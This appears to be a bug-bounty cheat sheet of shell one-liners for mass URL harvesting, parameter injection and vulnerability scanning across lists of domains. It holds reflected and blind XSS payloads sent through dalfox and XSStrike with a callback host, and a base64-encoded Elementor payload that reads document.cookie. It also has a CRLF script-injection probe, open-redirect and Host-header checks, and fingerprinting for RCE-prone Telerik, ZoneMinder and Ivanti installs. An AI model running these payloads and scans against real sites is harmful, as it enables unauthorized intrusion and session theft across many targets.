## XSS
    echo vulnweb.com | gau | tee domain.txt
    httpx -l domain.txt -mc 200,302 -o domain200.txt 
    cat domain200.txt | gf xss | sed "s/=.*/=/" | sed "s/URL: //" | tee domain4xss.txt 
    cat urls.txt | uro 
    dalfox file domain4xss.txt -b (xss.ht or collaborator) pipe 
    cat indeed.txt | kxss > xss.txt 
    python XSStrike/xsstrike.py --seeds domain4xss.txt --fuzzer --level 3 -rate 2 --blind --file-log-level WARNING --log-file output.log

    cat list.txt | httpx | xargs -I {} python xsstrike.py -u {} --level 3  --blind --file-log-level WARNING --log-file output.log

## paramReflect
    cat urls.txt | go run ParamsReflect.go
    cat injected_urls.txt | sort -u | httpx -ms "<h1>akira</h1>" -fe "Location: .*<h1>akira</h1>.*" -t 200

## gau+uro+httpx(My Xss)
     cat domains.txt | gau --blacklist 3dm,3ds,3gp,7z,aac,ai,aif,apk,avi,bat,bin,BMP,bz2,cfg,class,CR2,csh,css,csv,dat,deb,dmg,doc,docx,dwg,eot,EPS,exe,EXIF,flac,flv,gba,gdb,gif,gz,HEIC,hqx,ICO,ico,ics,iso,jar,jpeg,jpg,js,json,lua,m4a,m4v,mov,mp3,mp4,msi,NEF,nes,nrg,odp,ods,odt,ogg,ogv,otf,PBM,pdf,PGM,pkg,plist,png,PPM,ppt,pptx,ps,PSD,RAW,rb,rpm,rtf,srt,SVG,svg,swf,sys,tar,TGA,TIFF,ttf,txt,vob,wav,WEBP,webp,woff,woff2,xls,xlsx,xml,xpi,yaml,z64,z7,zip --providers wayback,commoncrawl,otx,urlscan --mt text/html,application/xhtml+xml,application/xml,application/xml+html,application/vnd.wap.xhtml+xml,application/xhtml+xml,text/xml --subs --fp --o domain4xss.txt

     cat domains.txt | uro --filter hasparams | qsreplace '"><h1>Akira</h1>' > domain4httpx.txt

     cat domain4httpx.txt | httpx -ms "<h1>Akira</h1>" -ct -t 200 -o bounty.txt

    #Note: have a server ? use:
    cat domains.txt | gau --providers wayback,commoncrawl,otx,urlscan --mt text/html,application/xhtml+xml,application/xml,application/xml+html,application/vnd.wap.xhtml+xml,application/xhtml+xml,text/xml --subs --fp | uro | grep -E 'https?://[^?]+\?[a-zA-Z0-9_]+=[^&]+(&[a-zA-Z0-9_]+=[^&]+)*' | qsreplace %22%3E%3Ch1%3EAkira%3C%2Fh1%3E | httpx -ms "<h1>Akira</h1>" -ct -t 200 -o bounty.txt
   
## one-Line:
    cat Domains.txt | gau | gf xss | sed "s/=.*/=/" | sed "s/URL: //" | uro | httpx -o domain4xss.txt

    cat params.js [.py|.go|paramspider.py] | uro --filter hasparams -b jpg png js json pdf txt -o 4xss.txt
## subdomain enumeration
    amass enum -active -d <DOMAIN> -dir amass_active/<DOMAIN>/
    amass enum -passive -d <DOMAIN> -dir amass_passive/<DOMAIN>/
    assetfinder <DOMAIN> | tee ./subdomains/assetfinder.txt

## web crawling
    for i in $(cat hosts-urls.txt); do katana -u $i >> ./katana_rzlts.txt; done
    cat hosts-urls.txt | hakrawler -timeout 5 -subs | tee ./hakrawler_rzlts.txt
    cat hosts-live.txt | gau --threads 15 | tee ./gau_rzlts.txt
    cat hosts-live.txt | waybackurls | tee ./wburls_rzlts.txt

## filtering
        cat katana_rzlts.txt hakrawler_rzlts.txt gau_rzlts.txt wburls_rzlts.txt | sort -u > uniq.txt; cat uniq.txt | grep "<DOMAIN>" | grep "\?" > 4xss.txt

## only params:
    grep -E -o 'https?://[^ ]+\?.+' filename

## wordpressXss:
    cat domain.txt | httpx -path "/wp-admin/admin-ajax.php?action=ptp_design4_color_columns&post_id=1&column_names=%3Ch1%3EAkira%3C/h1%3E" -ms "<h1>Akira</h1>" -fe "Location: .*<h1>Akira</h1>.*" -t 200 -mc 200

## Telerik_RCE(CVE-2017-11317)
    cat subs.txt | httpx -path "/Telerik.Web.UI.WebResource.axd?type=rau" -ms '"RadAsyncUpload handler is registered succesfully' -t 200 -o telerik2.txt
    
## zoneminder_RCE CVE-2023-26035
    cat alldomains.txt | httpx -path "/index.php" -ms 'name="__csrf_magic"' -t 200 -o CVE-2023-26035.txt

## CVE-2023-38388
    cat privates/domainsroot.txt | httpx -path "/wp-content/plugins/jupiterx-core/readme.txt" -ms "Jupiter X Core" -o jupiter.txt

## CVE-2023-4596
    cat bugbounty/subs.txt | httpx -path '/wp-content/plugins/forminator/readme.txt' -ms  "Stable tag: 1\.([0-2][0-9]|3[0-6])\.[0-9]+" -o "forminator.txt"

## fusion-CVE-2022-1386.txt
    cat alldomains.txt | httpx -path "/wp-content/plugins/fusion-builder/readme.txt" -ms "Builder =" -o fusion-CVE-2022-1386.txt
    
## TeamCity
    cat alldomains.txt | httpx -path "/login.html" -ms "log in to teamcity" -o teamcity.txt

## CVE-2023-35078
    cat alldomains.txt | httpx -ms "ui.login.css?" -o CVE-2023-35078.txt

    /wp-content/plugins/forminator/readme.txt
## Elementor Xss
    cat subs.txt | httpx -path "wp-content/plugins/elementor/readme.txt" -mr "(?i)Stable tag: (3\.[0-5]\.[0-5]\d*)" -o elementor.txt -t 200
    www.target.com/#elementor-action:action=lightbox&settings=ewogICAgInR5cGUiOiAidmlkZW8iLAogICAgInVybCI6ICJodHRwOi8vIiwKICAgICJ2aWRlb1R5cGUiOiAiaG9zdGVkIiwKICAgICJ2aWRlb1BhcmFtcyI6IHsKICAgICAgICAib25lcnJvciI6ImFsZXJ0KGRvY3VtZW50LmRvbWFpbisnICcrZG9jdW1lbnQuY29va2llKSIsCiAgICAgICAgInN0eWxlIjogImJhY2tncm91bmQtY29sb3I6cmVkIgogICAgfQp9
    
## Symphonic
    cat subs.txt | httpx -path "_fragment" -ms 'Oops An Error Occurred' -o symphonic.txt -t 200
    
## Open Redirect
    cat URlSubs.txt | ~/go/bin/httpx -path "/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a%3Cscript%3Ealert('XSSSS')%3C/script%3E" -ms "XSSSSS" -fe "Location: .*XSSS.*" -t 200 -o xss.txt

    
    echo "https://web.archive.org/cdx/search/cdx?url=*.example.com&fl=original&collapse=urlkey" | httpx -er '(https?://[^&\s]+)[^&\s]*(\?|&)(outurl=|redirectionURL=|refURL=|returnURL=|siteurl=|targetURL=|urlTo=|redirectLocation=|redirectPage=|redirectPath=|redirectUrlTo=|urlRedirect=|redirectTo=|linkTo=|urlOut=|outboundUrl=|navTo=|jumpTo=|clickTo=|linkURL=|directTo=|moveTo=|outgoing_url=|outbound_link=|location_to=|forward=|from_url=|go=|goto=|host=|html=|image_url=|img_url=|load_file=|load_url=|login?to=|login_url=|logout=|navigation=|next=|next_page=|out=|page=|page_url=|path=|port=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|reference=|return=|returnTo=|return_path=|return_to=|return_url=|rt=|rurl=|show=|site=|target=|to=|uri=|url=|val=|validate=|view=|window=|location=|link=|click=|move=|jump=|follow=|nav=|ref=|locationURL=|redirectURL=|redirect_to_url=|pageurl=|navigate=|returnUrl=|redirectlink=|redirection=|referral=|direct=|forwardto=|gotoURL=|outlink=|targ=|linkto=|sendto=|dest=|destURL=|destination=|finalURL=|newUrl=|goToUrl=|navToURL=|referralURL=|returnURI=|uri_redirect=|path_redirect=|url_redirect=|location_redirect=|returnPath=|returnToURL=|outgoingURL=|redirectURI=|redirect_path=|redirect_url_path=|targetPath=|clickTarget=|followURL=|linkOut=|location_href=|jumpURL=|returnLink=|refLink=|sendURL=|url_destination=|redirect_destination=|goto_url=|forward_url=|nav_to=|move_to_url=|url_location=|redirect_location=|target_url=|target_link=|return_url_path=|return_to_path=|outgoing_link=|link_destination=|click_destination=|redirector=|redirection_link=|uri_location=|url_path=|path_to=|path_redirector=|go_url=|forward_link=|location_path=)[^&\s]*' -json | jq '.extracts[]' | sed 's/  "//g'| sed 's/"//g' | sed 's/\[//g' | sed 's/\]//g' | sed 's/,//g' > openredirect.txt

## Host:
    cat domains.txt | httpx -H "Host: example.com" -t 200 -ms 'example.com' -mc 200 -fe "Location: .*example.com.*"
    
## Nuclie
    cat domains.txt | nuclei -nt -es info -ept ssl -o data.txt
    nuclei -l domains.txt -nt -o data.txt
    nuclei -l domains.txt -t cves/2023 -o data.txt
    nuclei -l domains.txt -es info -ept ssl -o data.txt
    
# dirsearch 
    dirsearch -l domain200.txt -e '' -i 200-299 -x 300-599

